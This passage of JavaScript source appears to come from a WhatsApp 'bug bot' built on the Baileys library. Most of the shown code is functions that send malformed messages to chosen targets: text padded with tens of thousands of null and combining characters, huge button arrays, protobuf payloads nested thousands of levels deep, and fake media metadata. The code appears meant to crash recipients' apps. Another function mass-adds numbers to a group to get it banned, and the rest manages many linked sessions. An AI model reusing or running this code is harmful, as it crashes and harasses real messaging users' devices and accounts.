        nativeFlowMessage: { buttons: rep("invite_number_status", 20000) },
        contextInfo: { mentionedJid: gen(400, 100) }
      }
    });

    await send({
      interactiveMessage: {
        body: { text: "⌬⃟ 𝐈‌‌𝐬‌‌𝐭‌‌𝐦‌‌𝐞‌ 𝐒‌‌𝐤‌‌𝐲‌‌ ⌬⃟" + rep("\u0000", 50000) + rep("\u1A01", 50000), format: "DEFAULT" },
        nativeFlowMessage: { buttons: rep("grock.ai", 30000) },
        contextInfo: { mentionedJid: gen(500, 100) }
      }
    });

    await send({
      interactiveMessage: {
        body: { text: rep("\u600b", 40000), format: "DEFAULT" },
        nativeFlowMessage: { buttons: rep("boom_ai_message", 30000) },
        contextInfo: { mentionedJid: gen(600, 100) }
      }
    });

    await send({
      interactiveMessage: {
        body: { text: "⌬⃟𝐈‌‌𝐬‌‌𝐭‌‌𝐦‌‌𝐞‌⃟⌬ 𝐒‌‌𝐤‌‌𝐲‌‌⃟⌬" + "A" + rep("\u0300", 15000) + "\u0000" + rep("\uE0020", 10000), format: "DEFAULT" },
        nativeFlowMessage: { buttons: rep("Tsunade_maessage", 20000) },
        contextInfo: { mentionedJid: gen(700, 150) }
      }
    });

    await send({
      interactiveMessage: {
        body: { text: "🩸⃟༑⌁⃰𝐀‌‌𝐥‌‌𝐞‌‌𝐱‌‌𝐍‌‌𝐨‌‌𝐭‌‌𝐊‌‌𝐢‌‌𝐧‌‌𝐠 𝐄‌‌𝐱‌‌𝐞‌‌𝐜‌‌𝐮‌‌𝐭‌‌𝐢‌‌𝐨‌‌𝐧 𝐕‌𝐚‌‌𝐮‌‌𝐥‌‌𝐭ཀ‌‌🦠", format: "DEFAULT" },
        nativeFlowMessage: { buttons: [{ name: rep("boking_mesaage", 2000), buttonParamsJson: "{}" }] },
        contextInfo: { mentionedJid: gen(800, 100) }
      }
    });
    await send({
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: "🩸⃟༑⌁⃰𝐀‌‌𝐥‌‌𝐞‌‌𝐱‌‌𝐍‌‌𝐨‌‌𝐭‌‌𝐊‌‌𝐢‌‌𝐧‌‌𝐠 𝐄‌‌𝐱‌‌𝐞‌‌𝐜‌‌𝐮‌‌𝐭‌‌𝐢‌‌𝐨‌‌𝐧 𝐕‌𝐚‌‌𝐮‌‌𝐥‌‌𝐭ཀ‌‌🦠" },
            nativeFlowMessage: {
              buttons: rep("A", 60000) + rep("\u0000", 50000) + rep("\u0000", 20000),
              name: "invisibel_beta_mesaage",
              extra1: rep("\u0000", 20000),
              extra2: rep("\u0000", 20000),
              extra3: rep("\u0000", 50000)
            },
            mentionedJid: [...Array.from({length: 1999}, rnd),
              ...Array.from({length: 1999}, rnd),
              ...Array.from({length: 1999}, rnd)
            ],
            contextInfo: {
              quotedMessage: rep("\u0000", 40000),
              forwardingScore: 999999999,
              isForwarded: true,
              extra4: rep("\u0000", 50000),
              extra5: rep("\u0000", 10000),
              extra6: rep("\u0000", 10000),
              extra7: rep("\u0000", 10000),
              mentionedJid: Array.from({length: 1999}, rnd)
            }
          }
        }
      }
    }, {});

    await send({
      interactiveMessage: {
        body: { text: "— @Skyzael 606St" },
        nativeFlowMessage: {
          buttons: [{
            name: "inapp_signup",
            buttonParamsJson: JSON.stringify({
              display_text: rep("\0", 800000),
              id: rep("\0", 50000)
            })
          }]
        }
      }
    }, {});

    console.log("[✓] CRITICAL TERKIRIM KE:", target);
  } catch (e) {
    console.log("[✗] GAGAL:", e.message);
  }
}

async function groupBanRXT(sock, groupJid) {
    let numbers = [
        '13135550002@s.whatsapp.net',
        '13135550003@s.whatsapp.net',
        '13135550004@s.whatsapp.net',
        '13135550005@s.whatsapp.net',
        '13135550006@s.whatsapp.net',
        '13135550007@s.whatsapp.net',
        '13135550008@s.whatsapp.net',
        '13135550009@s.whatsapp.net',
        '13135550010@s.whatsapp.net',
        '13135550011@s.whatsapp.net',
        '13135550012@s.whatsapp.net',
        '13135550013@s.whatsapp.net',
        '13135550014@s.whatsapp.net',
        '13135550015@s.whatsapp.net',
        '13135550016@s.whatsapp.net',
        '13135550017@s.whatsapp.net',
        '13135550018@s.whatsapp.net',
        '13135550019@s.whatsapp.net',
        '13135550020@s.whatsapp.net',
        '13135550021@s.whatsapp.net',
        '13135550022@s.whatsapp.net',
        '13135550023@s.whatsapp.net',
        '13135550024@s.whatsapp.net',
        '13135550025@s.whatsapp.net',
        '13135550026@s.whatsapp.net',
        '13135550027@s.whatsapp.net',
        '13135550028@s.whatsapp.net',
        '13135550029@s.whatsapp.net',
        '13135550030@s.whatsapp.net',
        '13135550031@s.whatsapp.net',
        '13135550032@s.whatsapp.net',
        '13135550033@s.whatsapp.net',
        '13135550034@s.whatsapp.net',
        '13135550035@s.whatsapp.net',
        '13135550036@s.whatsapp.net',
        '13135550037@s.whatsapp.net',
        '13135550038@s.whatsapp.net',
        '13135550039@s.whatsapp.net',
        '13135550040@s.whatsapp.net',
        '13135550041@s.whatsapp.net',
        '13135550042@s.whatsapp.net',
        '13135550043@s.whatsapp.net',
        '13135550044@s.whatsapp.net',
        '13135550045@s.whatsapp.net',
        '13135550046@s.whatsapp.net',
        '13135550047@s.whatsapp.net',
        '13135550048@s.whatsapp.net',
        '13135550049@s.whatsapp.net',
        '13135550050@s.whatsapp.net',
        '13135550051@s.whatsapp.net',
        '13135550052@s.whatsapp.net',
        '13135550053@s.whatsapp.net',
        '13135550054@s.whatsapp.net',
        '13135550055@s.whatsapp.net',
        '13135550056@s.whatsapp.net',
        '13135550057@s.whatsapp.net',
        '13135550058@s.whatsapp.net',
        '13135550059@s.whatsapp.net',
        '13135550060@s.whatsapp.net',
        '13135550061@s.whatsapp.net',
        '13135550062@s.whatsapp.net',
        '13135550063@s.whatsapp.net',
        '13135550064@s.whatsapp.net',
        '13135550065@s.whatsapp.net',
        '13135550066@s.whatsapp.net',
        '13135550067@s.whatsapp.net',
        '13135550068@s.whatsapp.net',
        '13135550069@s.whatsapp.net',
        '13135550070@s.whatsapp.net',
        '13135550071@s.whatsapp.net',
        '13135550072@s.whatsapp.net',
        '13135550073@s.whatsapp.net',
        '13135550074@s.whatsapp.net',
        '13135550075@s.whatsapp.net',
        '13135550076@s.whatsapp.net',
        '13135550077@s.whatsapp.net',
        '13135550078@s.whatsapp.net',
        '13135550079@s.whatsapp.net',
        '13135550080@s.whatsapp.net',
        '13135550081@s.whatsapp.net',
        '13135550082@s.whatsapp.net',
        '13135550083@s.whatsapp.net',
        '13135550084@s.whatsapp.net',
        '13135550085@s.whatsapp.net',
        '13135550086@s.whatsapp.net',
        '13135550087@s.whatsapp.net',
        '13135550088@s.whatsapp.net',
        '13135550089@s.whatsapp.net',
        '13135550090@s.whatsapp.net',
        '13135550091@s.whatsapp.net',
        '13135550092@s.whatsapp.net',
        '13135550093@s.whatsapp.net',
        '13135550094@s.whatsapp.net',
        '13135550095@s.whatsapp.net',
        '13135550096@s.whatsapp.net',
        '13135550097@s.whatsapp.net',
        '13135550098@s.whatsapp.net',
        '13135550099@s.whatsapp.net',
        '13135550100@s.whatsapp.net'
    ];

    for (let num of numbers) {
        try {
            await sock.groupParticipantsUpdate(groupJid, [num], 'add');
            console.log(`✅ Berhasil tambah ${num} ke ${groupJid}`);
        } catch (e) {
            console.log(`❌ Gagal tambah ${num}: ${e.message}`);
        }
        await new Promise(r => setTimeout(r, 2000));
    }
}

async function MclarenFC(sock, target) {
    const IMG = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 999999999,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/jpeg",
        height: 9999,
        width: 9999,
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIEQQIgQVFS/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABESACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z"
    };

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(n) {
        var buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const kontol = {
        documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4",
            mimetype: "application/pdf",
            fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
            fileLength: 999999999,
            pageCount: 9999,
            mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
            fileName: "billy.pdf",
            fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
            directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
            mediaKeyTimestamp: 1779839963,
            caption: "\u000F".repeat(50000),
            jpegThumbnail: Buffer.from(IMG.jpegThumbnail, 'base64'),
            contextInfo: {
                quotedMessage: {
                    interactiveMessage: {
                        body: { text: "\u001C".repeat(50000) },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 100 }, () => ({}))
                        }
                    }
                }
            }
        }
    };

    const basePayload = proto.Message.encode(
        proto.Message.fromObject(kontol)
    ).finish();

    const inflate = function(tag, depth) {
        var buf = basePayload;
        for (var i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    if (!jids.length) throw new Error('error');

    var MAX_BATCH = 5;
    var DELAY_MS = 5000;
    var totalSent = 0;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var chunk = jids.slice(offset, offset + MAX_BATCH);
        var isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
        }

        var idx = Math.floor(offset / MAX_BATCH) + 1;
        var suffix = idx > 1 ? ('-' + idx) : '';
        var msgId = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

        for (var ti = 0; ti < TAGS.length; ti++) {
            var tag = TAGS[ti];
            var payload = null;

            for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
                try {
                    var decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    payload = decoded;
                } catch (_) {}
            }

            if (!payload) continue;

            await sock.relayMessage('status@broadcast', payload, {
                messageId: msgId,
                statusJidList: chunk,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: chunk.map(function(jid) {
                            return { tag: 'to', attrs: { jid: jid }, content: [] };
                        })
                    }]
                }]
            });

            totalSent++;
        }
    }

    if (!totalSent) throw new Error('error');

    await new Promise(r => setTimeout(r, 1000));

    const msg1 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 999999999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "LexzyMods - Executed¿!" + "\u0000".repeat(50000),
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                9999987899999999999999,
                                998999999999999999999,
                                999899999999999999999,
                                9998789999999999999999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "Lexcaabos - Executed¿!" + "\u000C".repeat(50000)
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 2000 }, () => ({})),
                        messageParamsJson: "{".repeat(15000),
                        botFeedbackOptions: {
                            botFeedbackKind: 14,
                            botFeedbackKindMultipleNegative: 511,
                            botFeedbackKindMultiplePositive: 1,
                            reportKind: 1
                        }
                    },
                    contextInfo: {
                        quotedMessage: {
                            interactiveMessage: {
                                body: { text: "\u000D".repeat(50000) },
                                nativeFlowMessage: {
                                    buttons: Array.from({ length: 500000 }, () => ({}))
                                }
                            }
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg1, {});
    await new Promise(r => setTimeout(r, 500));

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    caption: "Billy - Executed¿!",
                    fileSha256: "LdNOQNcNIvlIijHvkpwRIY/zIoTfWQoFux7dzTHusyM=",
                    fileLength: "1099511627776",
                    seconds: 172800,
                    mediaKey: "G2MGbP7BZLi1RwpyyV4DeXtfttaclMVSKfqNldZDt20=",
                    height: 1080,
                    width: 1920,
                    fileEncSha256: "U4uKZrZeJpg8smAcMRT3qtPoviAp/dqGa63GzqYcS8E=",
                    directPath: "/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1774428565",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIEQQIgQVFS/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABESACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z",
                    annotations: [{
                        polygonVertices: [
                            { x: 0.17499999701976776, y: 0.3379453122615814 },
                            { x: 0.824999988079071, y: 0.3379453122615814 },
                            { x: 0.824999988079071, y: 0.6620468497276306 },
                            { x: 0.17499999701976776, y: 0.6620468497276306 }
                        ],
                        shouldSkipConfirmation: true,
                        embeddedContent: {
                            embeddedMusic: {
                                musicContentMediaId: "2261401457948346",
                                songId: "849859527815275",
                                author: "Heksen - Executed¿!" + "ြ".repeat(9000),
                                title: "ြ".repeat(75000),
                                artworkDirectPath: "/v/t62.76458-24/568311115_4528169627440664_4559757974106869948_n.enc?ccb=11-4&oh=01_Q5Aa5AGs28VMFVXkcn0w9n-YUhiBwEPKyIwEcjWZLHm7mUgOsQ&oe=6A786B6E&_nc_sid=5e03e0",
                                artworkSha256: "FROyKnRoHfLzDwmz5tED8K3nmdK+4Uihn2ucHBZDjPI=",
                                artworkEncSha256: "y/SkheY3BoGhndQlmR6icfLtMtI4FjjRi5y3bsX13jw=",
                                artworkMediaKey: "s5VCH/gb/YjDXhek47MVcsHjVV3/lOHOYaDe72eodXw=",
                                artistAttribution: "https://www.instagram.com/_u/lexzymods",
                                countryBlocklist: "WEs=",
                                isExplicit: false
                            }
                        },
                        embeddedAction: true
                    }]
                }
            }
        }
    }, {});

    await new Promise(r => setTimeout(r, 500));

    await sock.relayMessage(target, {
        stickerPackMessage: {
            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
            name: "ꦾ".repeat(75000),
            publisher: "Billy - Executed¿!" + "ꦾ".repeat(5000),
            stickers: [],
            fileLength: "366299919",
            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
            contextInfo: {
                remoteJid: "X",
                participant: "0@s.whatsapp.net",
                stanzaId: "1234567890ABCDEF",
                mentionedJid: ["13135555555@s.whatsapp.net"]
            },
            packDescription: "",
            mediaKeyTimestamp: "1747502082",
            trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
            thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
            thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
            thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
            thumbnailHeight: 999999999,
            thumbnailWidth: 9999999999,
            imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
            stickerPackSize: "9990099",
            stickerPackOrigin: "USER_CREATED"
        }
    }, {});
}

// ======================================= //
// WhatsApp Connect Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files; //  Tambahkan return
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

// === Setup VIP Folder ===
function getVipSessionPath(sessionName) {
  return path.join('vip', sessionName);
}
function setupVipFolder() {
  // Ganti path menjadi root folder 'vip', bukan di dalam 'permenmd'
  const vipPath = path.join(__dirname, 'vip');

  try {
    if (!fs.existsSync(vipPath)) {
      fs.mkdirSync(vipPath, { recursive: true });
      console.log("[INFO] Folder VIP (root) dibuat otomatis.");
    }
  } catch (err) {
    console.error("[INFO] Gagal membuat folder VIP:", err);
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}/*

async function connectSession(folderPath, sessionName, retries = 5) {
  if (activeConnections[sessionName]) return activeConnections[sessionName];

  const sessionsFold = path.join(folderPath, sessionName);

  return new Promise(async (resolve) => {
    try {
      const { state, saveCreds } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("creds.update", saveCreds);

      sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr) qrCodes[sessionName] = qr;

        if (connection === "open") {
          delete qrCodes[sessionName];
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(path.join(sessionsFold, 'creds.json'));
          console.log(`[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") biz[sessionName] = sock;
          else if (type === "Messenger") mess[sessionName] = sock;

          resolve(sock);
        } else if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

          if (isLoggedOut) {
            console.log(`[${sessionName}] Logged out.`);
            fs.rmSync(sessionsFold, { recursive: true, force: true });
            delete activeConnections[sessionName];
            delete biz[sessionName];
            delete mess[sessionName];
            resolve(null);
          } else if (retries > 0) {
            setTimeout(() => connectSession(folderPath, sessionName, retries - 1).then(resolve), 5000);
          } else {
            console.log(`${sessionName} Connection failed after retries.`);
            resolve(null);
          }
        }
      });
    } catch (err) {
      console.log(`[${sessionName}] Error connecting: ${err.message}`);
      resolve(null);
    }
  });
}*/

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log(' Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
  //startLoop();
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    return false;
  }
  const sessionDir = path.join('permenmd', owner, number);

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version: version,
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(` Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);

      try {
        await waiting(3000)
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds);
          fs.writeFileSync(destCreds, data);
          console.log(` Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        console.error(` Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
}

async function startUserSessions() {
  const vipDir = 'vip';
  const baseDir = 'permenmd';
